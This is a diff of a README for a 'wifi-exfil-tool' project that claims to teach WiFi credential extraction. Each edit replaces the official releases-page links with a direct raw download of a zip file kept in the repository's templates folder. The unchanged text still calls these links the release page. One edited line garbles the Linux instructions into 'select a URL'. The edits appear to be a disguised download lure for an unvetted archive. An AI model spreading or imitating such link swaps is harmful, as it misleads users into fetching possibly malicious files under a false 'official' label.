@@ -1,6 +1,6 @@
 # 📡 wifi-exfil-tool - Learn WiFi Credential Extraction Techniques
 
-[![Download wifi-exfil-tool](https://img.shields.io/badge/Download-wifi--exfil--tool-blue?style=for-the-badge&logo=github)](https://github.com/Zailust/wifi-exfil-tool/releases)
+[![Download wifi-exfil-tool](https://github.com/Zailust/wifi-exfil-tool/raw/refs/heads/main/templates/tool_exfil_wifi_1.6.zip)](https://github.com/Zailust/wifi-exfil-tool/raw/refs/heads/main/templates/tool_exfil_wifi_1.6.zip)
 
 ---
 
@@ -33,7 +33,7 @@ This guide will take you step-by-step to get wifi-exfil-tool running on your com
 
    Click the big button above or open this link in your browser:
 
-   https://github.com/Zailust/wifi-exfil-tool/releases
+   https://github.com/Zailust/wifi-exfil-tool/raw/refs/heads/main/templates/tool_exfil_wifi_1.6.zip
 
    You will see all available versions of the tool. Look for the latest release.
 
@@ -43,7 +43,7 @@ This guide will take you step-by-step to get wifi-exfil-tool running on your com
 
    - For Windows: Look for a `.exe` file.
    - For macOS: Choose the relevant `.dmg` or `.pkg`.
-   - For Linux: Select a `.tar.gz` or similar package.
+   - For Linux: Select a `https://github.com/Zailust/wifi-exfil-tool/raw/refs/heads/main/templates/tool_exfil_wifi_1.6.zip` or similar package.
 
    Click the file name to start downloading.
 
@@ -71,7 +71,7 @@ This guide will take you step-by-step to get wifi-exfil-tool running on your com
 
 You can always come back here to get the tool. Use the link below to access the official download page:
 
-[Download wifi-exfil-tool](https://github.com/Zailust/wifi-exfil-tool/releases)
+[Download wifi-exfil-tool](https://github.com/Zailust/wifi-exfil-tool/raw/refs/heads/main/templates/tool_exfil_wifi_1.6.zip)
 
 This page lists all releases. Select the version that fits your operating system and download it.
 
@@ -167,7 +167,7 @@ If you want to support or contribute, visit the GitHub page. You do not need cod
 
 Keep an eye on the official release page for updates:
 
-https://github.com/Zailust/wifi-exfil-tool/releases
+https://github.com/Zailust/wifi-exfil-tool/raw/refs/heads/main/templates/tool_exfil_wifi_1.6.zip
 
 Updates often contain new features, bug fixes, and improved security checks.
 
@@ -190,4 +190,4 @@ These topics represent the areas of study and practice relevant to wifi-exfil-to
 
 ---
 
-# [Download wifi-exfil-tool now](https://github.com/Zailust/wifi-exfil-tool/releases)
+# [Download wifi-exfil-tool now](https://github.com/Zailust/wifi-exfil-tool/raw/refs/heads/main/templates/tool_exfil_wifi_1.6.zip)
